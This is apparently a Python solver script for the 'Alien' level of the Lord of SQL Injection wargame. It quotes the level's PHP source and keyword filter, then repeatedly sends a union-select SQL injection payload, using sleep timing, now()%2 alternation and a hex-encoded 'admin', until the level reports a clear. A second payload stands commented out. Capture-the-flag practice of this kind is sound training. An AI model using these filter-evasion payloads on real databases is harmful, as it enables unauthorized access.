#!/usr/bin/env python3
import los
import los_cookies as lc


def main():
    """
    Alien 32

    if(preg_match('/admin|and|or|if|coalesce|case|_|\.|prob|time/i', $_GET['no'])) exit("No Hack ~_~");
    $query = "select id from prob_alien where no={$_GET[no]}";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $query2 = "select id from prob_alien where no='{$_GET[no]}'";
    echo "<hr>query2 : <strong>{$query2}</strong><hr><br>";
    if($_GET['no']){
      $r = mysqli_fetch_array(mysqli_query($db,$query));
      if($r['id'] !== "admin") exit("sandbox1");
      $r = mysqli_fetch_array(mysqli_query($db,$query));
      if($r['id'] === "admin") exit("sandbox2");
      $r = mysqli_fetch_array(mysqli_query($db,$query2));
      if($r['id'] === "admin") exit("sandbox");
      $r = mysqli_fetch_array(mysqli_query($db,$query2));
      if($r['id'] === "admin") solve("alien");
  }
    """

    url = "https://los.rubiya.kr/chall/alien_91104597bf79b4d893425b65c166d484.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'no'

    response = ''
    while 'Clear!' not in response:

        payload = "'#'#'\nunion select sleep(1/2) union select now()%2 union select 0x61646D696E limit 2,1#"
        p = los.SqlInjection(url, cook, method, inj_param, payload)
        print('')

        # payload = "1 union select char(97+now()%2,100,109,105,110) union select sleep(1)#' union select char(96+now()%2,100,109,105,110) union select sleep(1)#"
        response = p.my_request()

    print('\nAlien Clear!')


if __name__ == '__main__':
    main()
